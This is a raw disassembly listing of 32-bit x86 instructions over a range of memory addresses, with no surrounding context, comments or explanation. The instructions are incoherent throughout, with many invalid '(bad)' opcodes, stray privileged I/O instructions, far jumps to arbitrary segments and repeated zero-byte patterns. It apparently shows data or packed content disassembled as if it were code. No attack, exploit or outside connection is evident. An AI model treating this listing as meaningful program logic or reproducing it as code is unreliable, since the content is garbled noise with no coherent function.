  426793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426794:	(bad)  
  426795:	jnp    0x426743
  426797:	mov    dh,0x92
  426799:	call   0xc60c4e2c
  42679e:	call   0x96e6:0x875f2dbb
  4267a5:	add    BYTE PTR [eax],al
  4267a7:	add    BYTE PTR [eax],al
  4267a9:	add    dl,bl
  4267ab:	cmp    eax,0x3cfbf339
  4267b0:	cmp    DWORD PTR [esi-0x31064928],eax
  4267b6:	mov    ecx,0xaf7fea46
  4267bb:	mov    BYTE PTR [edx],dl
  4267bd:	xchg   edx,eax
  4267be:	mov    dl,0x3d
  4267c0:	std    
  4267c1:	repnz repz cmp al,0x15
  4267c5:	xchg   BYTE PTR [eax-0x4e312646],dl
  4267cb:	push   edx
  4267cc:	loop   0x42684d
  4267ce:	jae    0x426758
  4267d0:	jmp    0x9fca:0x6e27a291
  4267d7:	mov    ecx,0x2dfaf4a7
  4267dc:	pop    esi
  4267dd:	mov    al,ds:0x34fd9672
  4267e2:	inc    edi
  4267e3:	das    
  4267e4:	div    BYTE PTR [ebp-0x2add786e]
  4267ea:	sbb    bh,BYTE PTR [ecx+0x1c]
  4267ed:	xchg   esp,eax
  4267ee:	cld    
  4267ef:	sub    al,0xb5
  4267f1:	jnp    0x426813
  4267f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267f4:	jo     0x426805
  4267f6:	ror    eax,1
  4267f8:	xor    edi,eax
  4267fa:	outs   dx,DWORD PTR ds:[esi]
  4267fb:	js     0x42683c
  4267fd:	add    esi,DWORD PTR [ebp+0x2]
  426800:	pop    esi
  426801:	aas    
  426802:	jge    0x42687d
  426804:	sbb    al,0xa8
  426806:	in     al,dx
  426807:	xor    al,0x89
  426809:	jge    0x426833
  42680b:	repnz call FWORD PTR [edi+0x0]
  42680f:	add    BYTE PTR [eax],al
  426811:	add    BYTE PTR [eax],al
  426813:	dec    edx
  426814:	xchg   BYTE PTR [edi],dh
  426816:	mov    ds:0xe8807c74,eax
  42681b:	jbe    0x42681f
  42681d:	xchg   DWORD PTR [edx+ebp*8+0x36495d7e],ebp
  426824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426825:	(bad)  
  426826:	pop    edi
  426827:	stos   BYTE PTR es:[edi],al
  426828:	stos   BYTE PTR es:[edi],al
  426829:	xchg   ebp,esi
  42682b:	popa   
  42682c:	int    0x4c
  42682e:	loope  0x4268a5
  426830:	jle    0x426885
  426832:	call   0x9ccb6aad
  426837:	(bad)  
  426838:	ja     0x42688a
  42683a:	es sub al,0x40
  42683d:	call   0x44df2a
  426842:	bound  ecx,QWORD PTR [ecx]
  426844:	into   
  426845:	inc    esp
  426846:	cmc    
  426847:	jnp    0x426874
  426849:	xchg   DWORD PTR [esi+ecx*8+0x2e017d7d],esi
  426850:	retf   0x7c06
  426853:	push   ecx
  426854:	jge    0x4268d3
  426856:	in     eax,dx
  426857:	mov    DWORD PTR [ecx+0x7093437],edi
  42685d:	or     dh,BYTE PTR [edx+0x3b]
  426860:	mov    bh,BYTE PTR [ecx]
  426862:	in     eax,0x41
  426864:	lar    esp,WORD PTR [esi]
  426867:	mov    eax,0xb451006
  42686c:	cmp    dh,BYTE PTR [edi]
  42686e:	mov    ecx,0x34890083
  426873:	jmp    0xf7e5f3
  426878:	add    BYTE PTR [eax],al
  42687a:	add    BYTE PTR [eax],al
  42687c:	mov    ecx,0x7824f406
  426881:	jnp    0x426900
  426883:	xchg   ebp,eax
  426884:	icebp  
  426885:	pop    es
  426886:	call   0x373ced74
  42688b:	or     al,0x1
  42688d:	pop    es
  42688e:	(bad)  
  42688f:	dec    DWORD PTR [esi+0x67]
  426892:	add    al,0x83
  426894:	jno    0x4268fc
  426896:	add    BYTE PTR [ebx-0x183f6e77],cl
  42689c:	sahf   
  42689d:	cmp    edi,ebx
  42689f:	ficom  WORD PTR [edi-0x13]
  4268a2:	adc    edi,DWORD PTR [esi+eiz*8+0x6]
  4268a6:	jge    0x426894
  4268a8:	xlat   BYTE PTR ds:[ebx]
  4268a9:	(bad)  
  4268aa:	out    dx,eax
  4268ab:	sub    ecx,DWORD PTR [ecx]
  4268ad:	jne    0x4268d2
  4268af:	ror    BYTE PTR ds:0xa855893f,1
  4268b5:	push   es
  4268b6:	push   ebp
  4268b7:	hlt    
  4268b8:	ja     0x426887
  4268ba:	sti    
  4268bb:	mov    edi,ecx
  4268bd:	fs and esi,eax
  4268c0:	dec    ebx
  4268c1:	and    bl,cl
  4268c3:	inc    edx
  4268c4:	(bad)
  4268c7:	btc    DWORD PTR [edi+0x33],ebp
  4268cb:	fdivp  st(2),st
  4268cd:	mov    BYTE PTR [edx+0x4d08885d],al
  4268d3:	call   0x5dc5645f
  4268d8:	or     BYTE PTR fs:[ebp-0x18],dl
  4268dc:	pushf  
  4268dd:	hlt    
  4268de:	sbb    eax,DWORD PTR [eax]
  4268e0:	add    BYTE PTR [eax],al
  4268e2:	add    BYTE PTR [eax],al
  4268e4:	add    BYTE PTR [ecx+0xf74f9c5],cl
  4268ea:	add    BYTE PTR [edi+0x6],0x57
  4268ee:	retf   
  4268ef:	(bad)  
  4268f0:	packssdw mm1,mm3
  4268f3:	adc    eax,ecx
  4268f5:	scas   al,BYTE PTR es:[edi]
  4268f6:	push   DWORD PTR [edx]
  4268f8:	retf   0x3cb
  4268fb:	int    0x0
  4268fd:	fadd   QWORD PTR [eax]
  4268ff:	test   DWORD PTR [ebp-0x8],0xcc1c7d7d
  426906:	pop    es
  426907:	jne    0x426915
  426909:	popa   
  42690a:	cdq    
  42690b:	or     BYTE PTR [ebp+0x75],0x73
  42690f:	jl     0x42691d
  426911:	bound  esp,QWORD PTR [ecx]
  426913:	inc    ecx
  426914:	imul   ch
  426916:	out    dx,al
  426917:	rol    BYTE PTR [eax],cl
  426919:	in     eax,dx
  42691a:	(bad)  
  42691b:	sar    ch,cl
  42691d:	cld    
  42691e:	fld    QWORD PTR [esi-0x1b3c678]
  426924:	jle    0x4268e0
  426926:	xchg   esi,eax
  426927:	jns    0x426976
  426929:	jns    0x426905
  42692b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42692c:	add    al,0x7f
  42692e:	loope  0x4269ab
  426930:	or     al,0xa2
  426932:	pop    ds
  426933:	inc    ecx
  426934:	call   0xe2063c9c
  426939:	jno    0x426951
  42693b:	das    
  42693c:	sti    
  42693d:	jg     0x42691e
  42693f:	(bad)  
  426940:	xlat   BYTE PTR ds:[ebx]
  426941:	std    
  426942:	rol    BYTE PTR gs:[eax],cl
  426945:	not    ah
  426947:	std    
  426948:	mov    BYTE PTR [eax],al
  42694a:	add    BYTE PTR [eax],al
  42694c:	add    BYTE PTR [eax],al
  42694e:	mov    eax,0x2d457cf5
  426953:	and    esi,DWORD PTR [ecx]
  426955:	aam    0x6e
  426957:	fcom   DWORD PTR [eax]
  426959:	aas    
  42695a:	out    dx,al
  42695b:	xchg   di,ax
  42695d:	xchg   DWORD PTR [eax-0x32f017b],ebp
  426963:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  426965:	xchg   DWORD PTR [eax+0xd557cfd],esp
  42696b:	mov    cl,0xe9
  42696d:	xchg   BYTE PTR [eax-0x9ea695b],ch
  426973:	cs mov ebx,?
  426976:	popa   
  426977:	lea    esi,[esi+0x55]
  42697a:	int    0x10
  42697c:	sbb    BYTE PTR [eax],bl
  42697e:	out    dx,al
  42697f:	out    0xfb,al
  426981:	(bad)  
  426982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426983:	and    dl,bl
  426985:	mov    ?,WORD PTR [eax+edx*4]
  426988:	inc    eax
  426989:	fadd   DWORD PTR [ecx+0x2]
  42698c:	mov    edi,DWORD PTR [edx+0x28]
  42698f:	repnz cdq 
  426991:	dec    eax
  426992:	lods   eax,DWORD PTR ds:[esi]
  426993:	add    DWORD PTR [esp+ebx*4],esp
  426996:	repnz xor eax,0xae31ca91
  42699c:	add    eax,0x7d3d9eb4
  4269a1:	jp     0x4269e3
  4269a3:	repnz scas eax,DWORD PTR es:[edi]
  4269a5:	inc    eax
  4269a6:	mov    ebx,esi
  4269a8:	pop    esp
  4269a9:	cmp    DWORD PTR [edi-0x7d],0x1a8d262
  4269b0:	lods   al,BYTE PTR ds:[esi]
  4269b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269b2:	add    BYTE PTR [eax],al
  4269b4:	add    BYTE PTR [eax],al
  4269b6:	add    BYTE PTR [ecx+eiz*4],dh
  4269b9:	out    0x4,eax
  4269bb:	mov    eax,0xb9caa9a2
  4269c0:	out    dx,al
  4269c1:	icebp  
  4269c2:	jg     0x426982
  4269c4:	test   BYTE PTR [edx],bh
  4269c6:	mov    ?,edx
  4269c8:	cmp    al,0xe5
  4269ca:	jns    0x426984
  4269cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269cd:	popa   
  4269ce:	sti    
  4269cf:	sti    
  4269d0:	mov    edx,0xb9a22dc2
  4269d5:	daa    
  4269d6:	jmp    0x426a0a
  4269d8:	shr    BYTE PTR [eax],1
  4269da:	call   0x96a2:0x9f5e2d20
  4269e1:	cdq    
  4269e2:	jp     0x42698c
  4269e4:	cli    
  4269e5:	ins    DWORD PTR es:[edi],dx
  4269e6:	cmp    al,0x71
  4269e8:	sub    al,0x9a
  4269ea:	jl     0x4269a4
  4269ec:	xchg   edx,eax
  4269ed:	pop    esi
  4269ee:	inc    eax
  4269ef:	gs ja  0x4269d1
  4269f2:	jns    0x426994
  4269f4:	mul    ch
  4269f6:	mov    ebx,0x961688f2
  4269fb:	mov    bh,0x3c
  4269fd:	retf   
  4269fe:	add    al,0xb7
  426a00:	cmp    al,0xc2
  426a02:	add    al,0xec
  426a04:	xor    al,0x79
  426a06:	jnp    0x426a58
  426a08:	ret    0x6000
  426a0b:	xor    bl,BYTE PTR [edx+0x75c0a837]
  426a11:	jecxz  0x4269fb
  426a13:	jbe    0x426a17
  426a15:	daa    
  426a16:	mov    cl,0x2e
  426a18:	xor    eax,0x82c8
  426a1d:	add    BYTE PTR [eax],al
  426a1f:	add    BYTE PTR [ebx+edi*2+0x55],dh
  426a23:	fstp   QWORD PTR ds:0x6270c03d
  426a29:	xchg   esi,eax
  426a2a:	aaa    
  426a2b:	cdq    
  426a2c:	nop
  426a2d:	jne    0x4269e6
  426a2f:	call   0xab696caa
  426a34:	(bad)  
  426a35:	cmp    al,0xcc
  426a37:	push   edx
  426a38:	je     0x426ab5
  426a3a:	inc    ebp
  426a3b:	sub    eax,0x6059128f
  426a40:	stos   BYTE PTR es:[edi],al
  426a41:	jbe    0x4269cc
  426a43:	pushf  
  426a44:	out    dx,al
  426a45:	cmp    ecx,eax
  426a47:	les    esi,FWORD PTR [ebp-0x75]
  426a4a:	inc    ebp
  426a4b:	xor    eax,0xf2c7c7cc
  426a50:	aaa    
  426a51:	add    bh,bh
  426a53:	pop    edi
  426a54:	mov    edx,0xee9cfb7a
  426a59:	or     eax,0x7e0eacb3
  426a5e:	jne    0x426a7d
  426a60:	sub    BYTE PTR [ebp-0x80e02ab],dh
  426a66:	out    dx,eax
  426a67:	jb     0x426ad3
  426a69:	or     ch,al
  426a6b:	or     ch,ch
  426a6d:	jge    0x426a6a
  426a6f:	bound  esi,QWORD PTR [edx-0x45c1f486]
  426a75:	jbe    0x426af6
  426a77:	dec    esp
  426a78:	leave  
  426a79:	add    bh,BYTE PTR [edi+0x44]
  426a7c:	and    eax,0x114c7f03
  426a81:	add    edi,DWORD PTR [edi+0x44]
  426a84:	add    BYTE PTR [eax],al
  426a86:	add    BYTE PTR [eax],al
  426a88:	add    BYTE PTR ds:0x79008703,cl
  426a8e:	xchg   esi,eax
  426a8f:	lea    edi,[edx+esi*4]
  426a92:	(bad)  
  426a93:	mov    ebp,0x74fcdc07
  426a98:	mov    eax,0x89b3c855
  426a9d:	mov    DWORD PTR [edx+0x4ec45be],edi
  426aa3:	mov    esi,0x8504af45
  426aa8:	shl    BYTE PTR [edx+0x40],0x7b
  426aac:	jge    0x426a9a
  426aae:	add    eax,0x3070575
  426ab3:	mov    DWORD PTR [ebp-0x1c],eax
  426ab6:	cli    
  426ab7:	stc    
  426ab8:	cmp    bl,BYTE PTR [ecx-0x52]
  426abb:	jne    0x426ac2
  426abd:	adc    ecx,eax
  426abf:	fucomip st,st(3)
  426ac1:	imul   eax,DWORD PTR [edx+0x185ce47d],0x7219c5ff
  426acb:	sti    
  426acc:	mov    BYTE PTR [ecx],cl
  426ace:	mov    cl,0x33
  426ad0:	inc    ebp
  426ad1:	jo     0x426aeb
  426ad3:	adc    edi,edi
  426ad5:	sbb    DWORD PTR [ecx-0x7d97b209],ebp
  426adb:	mov    edx,0xd410cf04
  426ae0:	add    BYTE PTR [ebx],dl
  426ae2:	mov    ebp,0xc85a04e3
  426ae7:	iret   
  426ae8:	add    BYTE PTR [edi+0x39e3c8],dl
  426aee:	add    BYTE PTR [eax],al
  426af0:	add    BYTE PTR [eax],al
  426af2:	leave  
  426af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426af4:	outs   dx,BYTE PTR ds:[esi]
  426af5:	or     BYTE PTR [edi-0x2e742838],al
  426afb:	mov    al,0xe3
  426afd:	push   es
  426afe:	xchg   edi,eax
  426aff:	enter  0x8bdb,0x41
  426b03:	scas   al,BYTE PTR es:[edi]
  426b04:	cmp    BYTE PTR [ebp-0x2e],0x5
  426b08:	je     0x426b0f
  426b0a:	jne    0x426b20
  426b0c:	inc    ecx
  426b0d:	les    ebp,FWORD PTR [ecx+0x2]
  426b10:	test   BYTE PTR [ebx],cl
  426b12:	ja     0x426b07
  426b14:	call   FWORD PTR [ecx]
  426b16:	(bad)  
  426b17:	call   0x1a2f:0xe37de6c5
  426b1e:	je     0x426b04
  426b20:	mov    bl,0xc1
  426b22:	iret   
  426b23:	jp     0x426ba1
  426b25:	inc    ebp
  426b26:	mov    ecx,0xfd189ca9
  426b2b:	ds out 0xfd,al
  426b2e:	cli    
  426b2f:	es out 0xfe,al
  426b32:	mov    al,0x2d
  426b34:	xchg   BYTE PTR [ecx],al
  426b36:	imul   BYTE PTR [eax+0x5c088000]
  426b3c:	dec    DWORD PTR [edx]
  426b3e:	clc    
  426b3f:	int3   
  426b40:	add    eax,DWORD PTR [eax]
  426b42:	jne    0x426b2f
  426b44:	test   BYTE PTR [edi],0xf5
  426b47:	pop    esi
  426b48:	scas   eax,DWORD PTR es:[edi]
  426b49:	add    bh,bh
  426b4b:	jo     0x426b58
  426b4d:	xor    esi,ebp
  426b4f:	dec    esi
  426b50:	xchg   BYTE PTR [eax],al
  426b52:	loope  0x426bc2
  426b54:	retf   0x4c
  426b57:	add    BYTE PTR [eax],al
  426b59:	add    BYTE PTR [eax],al
  426b5b:	adc    DWORD PTR [esi-0x1e8ef435],esi
  426b61:	inc    BYTE PTR [edi-0x3e85b08f]
  426b67:	xor    al,0x12
  426b69:	cld    
  426b6a:	xchg   DWORD PTR [ecx+0x3487047f],edi
  426b70:	sub    ebx,DWORD PTR [eax+edx*1-0x3ebc6114]
  426b77:	or     al,0x62
  426b79:	ja     0x426bbf
  426b7b:	jae    0x426be8
  426b7d:	ja     0x426bcb
  426b7f:	imul   ebp,DWORD PTR [ecx+eax*8+0x45],0x2
  426b84:	imul   eax,DWORD PTR [edx-0x31fd8e3e],0xfffffffb
  426b8b:	jle    0x426b9f
  426b8d:	mov    ds:0x6102ee40,eax
  426b92:	add    bl,dh
  426b94:	cmc    
  426b95:	mov    eax,0xc2207178
  426b9a:	adc    BYTE PTR [ecx-0x3173cb81],bh
  426ba0:	cmc    
  426ba1:	mov    esp,0xb8f5be33
  426ba6:	fwait
  426ba7:	push   eax
  426ba8:	jle    0x426b4c
  426baa:	mov    dh,BYTE PTR [edx+0x20c3646f]
  426bb0:	cmp    al,0x92
  426bb2:	adc    BYTE PTR [ebp-0x72c7adf1],bl
  426bb8:	jg     0x426bb6
  426bba:	(bad)  
  426bbb:	jle    0x426b74
  426bbd:	adc    al,0x98
  426bbf:	add    BYTE PTR [eax],al
  426bc1:	add    BYTE PTR [eax],al
  426bc3:	add    BYTE PTR [esi+0x87e78f5],cl
  426bc9:	mov    edx,0x8b7402a3
  426bce:	in     al,0xfb
  426bd0:	cli    
  426bd1:	les    ebx,FWORD PTR [edx+0x7b]
  426bd4:	mov    al,0x7f
  426bd6:	inc    ecx
  426bd7:	ja     0x426c2b
  426bd9:	jg     0x426c25
  426bdb:	jle    0x426b8d
  426bdd:	mov    dh,0x28
  426bdf:	mov    ds:0x1039cf53,eax
  426be4:	inc    ebp
  426be5:	(bad)  
  426be6:	in     eax,0xe9
  426be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426be9:	push   0xffffffbf
  426beb:	xor    DWORD PTR [edi],edi
  426bed:	jg     0x426bd5
  426bef:	xchg   ebx,eax
  426bf0:	mov    dl,0xc5
  426bf2:	or     al,0xf3
  426bf4:	repz les eax,FWORD PTR [esi+eax*4]
  426bf8:	nop
  426bf9:	dec    esi
  426bfa:	stc    
  426bfb:	into   
  426bfc:	mov    cl,0x42
  426bfe:	bnd ja 0x426bc2
  426c01:	cmp    dl,0x89
  426c04:	mov    al,ch
  426c06:	inc    DWORD PTR [eax]
  426c08:	push   es
  426c09:	mov    BYTE PTR [ebp+0x1],al
  426c0c:	repz in al,dx
  426c0e:	(bad)  
  426c0f:	stc    
  426c10:	rol    ebp,0xaf
  426c13:	out    dx,al
  426c14:	bound  esp,QWORD PTR [edx]
  426c16:	cli    
  426c17:	(bad)  
  426c18:	in     al,dx
  426c19:	fiadd  DWORD PTR [esi-0x41b67059]
  426c1f:	cmc    
  426c20:	jbe    0x426bf7
  426c22:	xchg   ch,cl
  426c24:	dec    eax
  426c25:	lds    ecx,FWORD PTR [ebx]
  426c27:	repnz add BYTE PTR [eax],al
  426c2a:	add    BYTE PTR [eax],al
  426c2c:	add    BYTE PTR [ebx+0x41660b12],al
  426c32:	add    al,BYTE PTR [eax]
  426c34:	jmp    0x16c940a2
  426c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c3a:	jg     0x426cb0
  426c3c:	in     eax,0xc9
  426c3e:	push   edi
  426c3f:	cmp    DWORD PTR [eiz*4+0x62721ff0],ebp
  426c46:	or     cl,BYTE PTR [ebp-0x79315e1b]
  426c4c:	scas   al,BYTE PTR es:[edi]
  426c4d:	loope  0x426cae
  426c4f:	out    dx,al
  426c50:	outs   dx,BYTE PTR ds:[esi]
  426c51:	in     al,dx
  426c52:	or     dh,BYTE PTR [edx+0x4503b7ae]
  426c58:	icebp  
  426c59:	ins    DWORD PTR es:[edi],dx
  426c5a:	mov    ah,0x43
  426c5c:	sbb    DWORD PTR [eax+0x5a],edi
  426c5f:	aaa    
  426c60:	lods   al,BYTE PTR ds:[esi]
  426c61:	dec    edx
  426c62:	lock fbstp TBYTE PTR [edx-0x4c]
  426c66:	sbb    al,BYTE PTR [edi+0x5b885a94]
  426c6c:	test   al,0x79
  426c6e:	(bad)  
  426c6f:	or     ebp,edx
  426c71:	add    al,0x86
  426c73:	retf   0x69
  426c76:	add    al,0x75
  426c78:	stc    
  426c79:	cmp    DWORD PTR [eax+0x6f],esi
  426c7c:	frstor [eax-0x490e77e5]
  426c82:	ret    
  426c83:	add    BYTE PTR ss:[esi+0x14],al
  426c87:	out    dx,al
  426c88:	jmp    0x426cae
  426c8a:	xor    bl,0x2
  426c8d:	xor    DWORD PTR [ecx+0x32],0xf2
  426c94:	add    BYTE PTR [eax],al
  426c96:	jg     0x426d02
  426c98:	test   DWORD PTR [ecx],ebx
  426c9a:	imul   edi,DWORD PTR fs:[ebx],0x6abc9741
  426ca1:	div    BYTE PTR [edi-0x2f04848a]
  426ca7:	or     al,0x6
  426ca9:	cmp    ecx,DWORD PTR [esi]
  426cab:	pop    ss
  426cac:	add    cl,BYTE PTR [edx+0x4017f9d5]
  426cb2:	lea    ecx,[edi-0x3b]
  426cb5:	jb     0x426cb9
  426cb7:	inc    DWORD PTR [esp+ecx*1-0x61]
  426cbb:	ret    0x890b
  426cbe:	push   ecx
  426cbf:	jp     0x426cf3
  426cc1:	inc    ebp
  426cc2:	pushf  
  426cc3:	jp     0x426c46
  426cc5:	je     0x426cb2
  426cc7:	mov    dh,bh
  426cc9:	pop    esi
  426cca:	push   edi
  426ccb:	loope  0x426d30
  426ccd:	aad    0x5f
  426ccf:	push   es
  426cd0:	pop    ebp
  426cd1:	ret    0x19c
  426cd4:	push   ebp
  426cd5:	mov    edi,eax
  426cd7:	std    
  426cd8:	dec    esp
  426cd9:	or     al,0x6b
  426cdb:	rcl    BYTE PTR [eax+0x5],cl
  426cde:	fist   WORD PTR [ebp+0x56225344]
  426ce4:	rcl    BYTE PTR [edi-0x29],cl
  426ce7:	mov    DWORD PTR [esi+0x3b],ebx
  426cea:	outs   dx,DWORD PTR ds:[esi]
  426ceb:	jp     0x426d6c
  426ced:	es pop edi
  426cef:	add    DWORD PTR [eax],eax
  426cf1:	movnti DWORD PTR [eax],edx
  426cf4:	jmp    DWORD PTR [ebp+0x47]
  426cf7:	xchg   esi,eax
  426cf8:	pop    es
  426cf9:	test   BYTE PTR [eax],al
  426cfb:	add    BYTE PTR [eax],al
  426cfd:	add    BYTE PTR [eax],al
  426cff:	jne    0x426d08
  426d01:	add    BYTE PTR [eax],al
  426d03:	sbb    edx,edx
  426d05:	inc    eax
  426d06:	add    DWORD PTR [ebp+0x68],esi
  426d09:	scas   eax,DWORD PTR es:[edi]
  426d0a:	or     esp,edx
  426d0c:	cmp    BYTE PTR [esi+0x55],dh
  426d0f:	cmp    eax,0x76517c8d
  426d14:	test   DWORD PTR [edx+edx*8],eax
  426d17:	jb     0x426d55
  426d19:	mov    ch,0x89
  426d1b:	mov    al,ds:0xd15d7627
  426d20:	icebp  
  426d21:	sub    ah,ch
  426d23:	cld    
  426d24:	cmp    eax,0xdfc587b8
  426d29:	inc    eax
  426d2a:	enter  0xa98e,0xf3
  426d2e:	mov    dl,0xb5
  426d30:	shl    BYTE PTR [ebx],1
  426d32:	pop    edx
  426d33:	cld    
  426d34:	adc    eax,0xbb7e62a4
  426d39:	syscall 
  426d3b:	in     al,dx
  426d3c:	xor    eax,0x747be794
  426d41:	dec    edx
  426d42:	sar    ah,0x25
  426d45:	xchg   esp,eax
  426d46:	bound  ebx,QWORD PTR [esi+0x3e]
  426d49:	mov    esp,0xfe0bf60b
  426d4e:	push   DWORD PTR [ebp+0xd]
  426d51:	jg     0x426dd0
  426d53:	test   DWORD PTR [edx-0xe],ebp
  426d56:	or     DWORD PTR [ecx],0x69
  426d59:	(bad)  
  426d5a:	jmp    FWORD PTR [edx+0x34]
  426d5d:	xor    eax,esi
  426d5f:	sbb    BYTE PTR [ebx+0x303b],0x0
  426d66:	add    BYTE PTR [eax],al
  426d68:	jp     0x426cf6
  426d6a:	mov    esi,0xf2c1b889
  426d6f:	mov    dl,0xb4
  426d71:	push   0xf329557c
  426d76:	inc    eax
  426d77:	in     al,0xfe
  426d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d7a:	mov    ebx,0xd6cdc887
  426d7f:	shr    DWORD PTR [edx-0xc],0xc3
  426d83:	xchg   bp,ax
  426d85:	add    bh,BYTE PTR [edi-0x69ad9de3]
  426d8b:	add    ah,ch
  426d8d:	aad    0x1c
  426d8f:	fwait
  426d90:	ja     0x426d9d
  426d92:	push   edx
  426d93:	(bad)  
  426d94:	cld    
  426d95:	(bad)  
  426d98:	inc    edx
  426d99:	cmc    
  426d9a:	and    al,0xf7
  426d9c:	sub    DWORD PTR [ecx],0xffffffe7
  426d9f:	add    esi,DWORD PTR [ebp-0x1c]
  426da2:	gs or  ecx,ebp
  426da5:	add    dh,dl
  426da7:	jg     0x426d38
  426da9:	add    cl,ch
  426dab:	add    ebp,DWORD PTR [esi-0x4d]
  426dae:	cmp    al,0x90
  426db0:	outs   dx,BYTE PTR ds:[esi]
  426db1:	mov    bl,0x22
  426db3:	cld    
  426db4:	jg     0x426d69
  426db6:	mov    bl,0xf6
  426db8:	pop    es
  426db9:	test   al,0x78
  426dbc:	and    DWORD PTR [ecx],edx
  426dbe:	mov    dl,0xf6
  426dc0:	cvtdq2ps xmm3,xmm2
  426dc3:	push   esi
  426dc4:	mov    ah,0x89
  426dc6:	sbb    al,0x8c
  426dc8:	jle    0x426d7e
  426dca:	adc    dl,ah
  426dcc:	add    BYTE PTR [eax],al
  426dce:	add    BYTE PTR [eax],al
  426dd0:	add    BYTE PTR [ebx+0x380290c6],ah
  426dd6:	jp     0x426db2
  426dd8:	push   esi
  426dd9:	mov    bh,0x89
  426ddb:	xor    al,0xb4
  426ddd:	jle    0x426d8a
  426ddf:	fwait
  426de0:	jp     0x426e12
  426de2:	push   cs
  426de3:	imul   ecx,esp,0xac148a7a
  426de9:	cld    
  426dea:	les    esp,FWORD PTR [esi+esi*8+0x3e954f6]
  426df1:	jne    0x426d7b
  426df3:	mov    ds:0xe879dad3,al
  426df8:	adc    BYTE PTR [esi+0xbca3987],cl
  426dfe:	or     esp,DWORD PTR [edx+0x49]
  426e01:	je     0x426e05
  426e03:	add    cl,ch
  426e05:	mov    edi,0x6d6217bf
  426e0a:	push   0xffffffff
  426e0c:	cs ja  0x426e59
  426e0f:	mov    DWORD PTR [esi+esi*1+0xe9ac133],ebp
  426e16:	test   BYTE PTR [ebx-0xb],cl
  426e19:	das    
  426e1a:	inc    ebx
  426e1b:	push   DWORD PTR [esi]
  426e1d:	mov    WORD PTR [esi],ss
  426e1f:	add    ebx,eax
  426e21:	push   es
  426e22:	or     BYTE PTR [ebp+0x27649],al
  426e28:	test   eax,0x5bbfc5bf
  426e2d:	add    BYTE PTR [ebx+0x72],bh
  426e30:	in     eax,dx
  426e31:	lods   eax,DWORD PTR ds:[esi]
  426e32:	imul   esi,DWORD PTR [edx-0x47],0x0
  426e36:	add    BYTE PTR [eax],al
  426e38:	add    BYTE PTR [eax],al
  426e3a:	inc    BYTE PTR [ecx+eax*1-0x67d8917]
  426e41:	jmp    0x426ebe
  426e43:	rol    DWORD PTR [esi+0xbbbacb1],0x6e
  426e4a:	imul   eax,DWORD PTR [ecx],0x0
  426e4d:	jmp    0x725a2d7f
  426e52:	pop    edx
  426e53:	push   0xffffffff
  426e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e56:	je     0x426eaa
  426e58:	aaa    
  426e59:	stos   DWORD PTR es:[edi],eax
  426e5a:	test   BYTE PTR ds:0x23851687,bl
  426e60:	lock jmp 0xf4fc:0xa97588e7
  426e68:	mov    edi,0x235fc0f
  426e6d:	pop    es
  426e6e:	cmp    al,0x2a
  426e70:	jne    0x426e34
  426e72:	cmc    
  426e73:	inc    edx
  426e74:	(bad)  
  426e75:	and    DWORD PTR [edi],esi
  426e77:	jmp    0x6e45968
  426e7c:	aaa    
  426e7d:	and    al,BYTE PTR [ebx+0x7300e94c]
  426e83:	add    eax,0x8dcc0000
  426e88:	add    al,0xf
  426e8a:	leave  
  426e8b:	dec    eax
  426e8c:	add    BYTE PTR [eax],al
  426e8e:	sbb    al,0xfb
  426e90:	(bad)  
  426e91:	cmp    ebx,DWORD PTR [edi+0x6f]
  426e94:	jle    0x426ec2
  426e96:	or     eax,0xcb8b0006
  426e9b:	ins    DWORD PTR es:[edi],dx
  426e9c:	adc    BYTE PTR [ebp+0x0],0x0
  426ea0:	add    BYTE PTR [eax],al
  426ea2:	add    BYTE PTR [ebx+eax*1-0x3f],dh
  426ea6:	add    ebp,DWORD PTR [ebx+ecx*2-0x43]
  426eaa:	jae    0x426ec3
  426eac:	sti    
  426ead:	outs   dx,BYTE PTR ds:[esi]
  426eae:	adc    al,0x37
  426eb0:	xchg   esi,eax
  426eb1:	sti    
  426eb2:	lock push ebp
  426eb4:	or     eax,eax
  426eb6:	mov    ecx,DWORD PTR [ecx+0x3e]
  426eb9:	xor    DWORD PTR [edx+ebx*8],0x4a
  426ebd:	sub    esi,DWORD PTR [ebp-0x21]
  426ec0:	add    al,0x4
  426ec3:	addr16 inc esp
  426ec5:	push   0xffffffef
  426ec7:	fild   QWORD PTR [esi]
  426ec9:	or     al,0x3b
  426ecb:	pop    es
  426ecc:	or     al,dl
  426ece:	jmp    0x4274ce
  426ed3:	rol    edi,cl
  426ed5:	ds inc ecx
  426ed7:	test   DWORD PTR [esi],edi
  426ed9:	add    BYTE PTR [esp+ecx*4],ah
  426edc:	add    eax,0x79507f7b
  426ee1:	outs   dx,DWORD PTR ds:[esi]
  426ee2:	or     bl,BYTE PTR [ebp+0x78a3fc38]
  426ee8:	test   eax,0x7be7003b
  426eed:	or     BYTE PTR [ebp+0x0],0xf0
  426ef1:	inc    ebx
  426ef2:	add    DWORD PTR ds:0xe7fc44fc,ebp
  426ef8:	cmp    ah,ch
  426efa:	mov    edx,DWORD PTR [ecx]
  426efc:	or     DWORD PTR [ebp-0xc958ab4],0x9727c88c
  426f06:	jbe    0x426f08
  426f08:	add    BYTE PTR [eax],al
  426f0a:	add    BYTE PTR [eax],al
  426f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f0d:	rol    DWORD PTR [ebx+0x7b683584],0xb9
  426f14:	jne    0x426f81
  426f16:	inc    DWORD PTR [esi+0x450037b8]
  426f1c:	dec    ecx
  426f1d:	mov    DWORD PTR [eax+0x55],edi
  426f20:	adc    eax,0x6dbebe81
  426f25:	mov    DWORD PTR [esi+0x10],esi
  426f28:	fwait
  426f29:	in     al,0x29
  426f2b:	in     al,0x93
  426f2d:	sub    al,cl
  426f2f:	or     BYTE PTR [ebx-0x6f01d10e],bl
  426f35:	in     al,0x29
